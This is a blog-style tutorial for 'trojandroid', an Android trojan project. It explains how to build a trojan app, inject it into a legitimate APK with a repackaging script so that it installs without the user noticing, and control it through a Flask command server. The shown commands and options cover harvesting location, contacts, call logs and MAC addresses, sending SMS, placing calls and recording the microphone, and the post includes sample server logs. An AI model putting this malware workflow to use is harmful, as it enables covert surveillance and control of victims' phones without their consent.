An Android Trojan
==

I'm gonna describe a little project I made, "**trojandroid**",
the first part of this project was to make a simple trojan app, to get information from the phone or to perform some remote action with the phone (send sms ...).
the second part was to inject this trojan into another app package (APK), so the trojan can be quietly install without the user noticing, the example I will take here will be with the package of [get10](https://github.com/remijouannet/get10).

this project is available on Github, three repo are parts of this project :

 - the trojan app, made with android studio : https://github.com/remijouannet/trojandroid_app
 - the server part, to talk with the trojan : https://github.com/remijouannet/trojandroid_server
 - the script to inject the trojan into an APK : https://github.com/remijouannet/trojandroid_mixapk
 - get10 : https://github.com/remijouannet/get10



trojandroid_app
--

The first thing to do is to open the project with android studio :

>\# git clone git@github.com:remijouannet/trojandroid_app.git


Try to build the app and launch it on your phone.
this app don't use any java library who isn't include in the android SDK to avoid error when it will be inject in other app.
The Trojan configuration is hardcode to avoid the dependence with any external XML.

So you're gonna have to modify the code yourself if you want to test it. the only code to modify is in **trojan.android.android_trojan.action**, modify the following code in the class **ConnectionServerThread**

>this.host = "pi.remijouannet.com"; //IP or domain name of the Trojan server

You can modify the "port" variable if you want, but it isn't recommended, you can have some errors with a non standard port for https.

Run the app on your phone or on the emulator (MaJ+F10), the generate APK will be use later.

>app/build/outputs/apk/app-debug.apk

the app is pretty simple, it's just an infinity loop in a background service who ask every 4000 seconds to the Trojan server if he had to do something, if he had he try to do it and send the result to the Trojan app, the service is relaunch every time the user unlock his phone.

trojandroid_mixapk
--

So this is a python script who use the wonderful [APKTOOL](https://ibotpeaches.github.io/Apktool/) to inject the trojan into another APK.

the script unpack the two APK, copy and modify the smali code of the trojan into get10 package, a few modification in the manifest is of course necessary, after this get10 can be repack, install and use without any problem.

the help message of the script

>\#  python mixapk.py -h

```
usage: mixapk.py [-h] [--apks trojanApk apkToInfect] [--adb]

ACTION

optional arguments:
  -h, --help            show this help message and exit
 --apks trojanApk apkToInfect specify the Trojan Apk and the APk to Infect
 --adb                 install the final APK with adb
```

So you have to have the Trojan APK and an APK of another app ([get10](https://play.google.com/store/apps/details?id=com.remijouannet.get10) for this example)
([a little howto I find to extract an installed app of your phone](http://codetheory.in/get-application-apk-file-from-android-device-to-your-computer/))

>  \# ./adb shell pm list packages | grep get10

```
package:com.remijouannet.get10
```

>  \# ./adb shell pm path com.remijouannet.get10

```
package:/data/app/com.remijouannet.get10-1/base.apk
```

>  \# ./adb pull /data/app/com.remijouannet.get10-1/base.apk && mv base.apk /tmp/

```
7544 KB/s (3117111 bytes in 0.403s)
```

>  \# mixapk.py --apks /PathTotrojandroid_app/app/build/outputs/apk/app-debug.apk /tmp/base.apk

let's do the magic.
if you didn't have any errors, you should find a file "app-final.pak" in your current directory.

if you have your phone in debug mode, you can push the apk to it with a simple adb command:

>\# adb install app-final.apk

trojandroid_server
--

the last component of the project, it's a simple flask script who expose webservice to interact with the trojan.

the trojan launch a background service who's gonna call the webservice continually to see if their is action to execute (send a sms, get the mac address ...), if an order,is given to the trojan, the answer is send from the trojan to the server to an another webservice.

so first of all install trojandroid_server from git


>\# git clone https://github.com/remijouannet/trojandroid_server.git

>\# pip install -r requirements.txt

>\# python setup.py install

after this you can launch teh server with the cmd androidtrojan

>\# androidtrojan -h

```
usage: androidtrojan [-h] [--location] [--contacts] [--calllogs] [--packages]
                     [--mac] [--sendsms PhoneNumber Message]
                     [--call PhoneNumber calltime] [--recordmic recordtime]
                     [-v] [-s folder]

ACTION

optional arguments:
  -h, --help            show this help message and exit
  --location            Get Location
  --contacts            Get Contacts
  --calllogs            Get calllogs
  --packages            Get installed packages
  --mac                 Get Mac address
  --sendsms PhoneNumber Message
                        Send SMS
  --call PhoneNumber calltime
                        Call a number for X millisecondes
  --recordmic recordtime
                        Record mic sound for X millisecondes and receive the
                        audio file
  -v, --verbose         verbose
  -s folder, --ssl folder
                        Folder with app.crt and app.key for https
```

per default, the android trojan use https, so you have to use the script ssl.sh in the repo to generate private/public key, after that you can just launch a command to get information from the trojan.

example to get the mac adress

>\# sudo androidtrojan -s /home/pi/git/trojandroid_server/ssl/ --mac -v
```
 * Running on https://192.168.1.36:443/ (Press CTRL+C to quit)
 * Restarting with stat
192.168.1.50 - - [08/Jul/2015 19:38:44] "GET /action HTTP/1.1" 200 -
192.168.1.50 f8:e0:79:ab:8c:88
f8:e0:79:ab:8c:88
192.168.1.50 - - [08/Jul/2015 19:38:45] "POST /result HTTP/1.1" 200 -
```
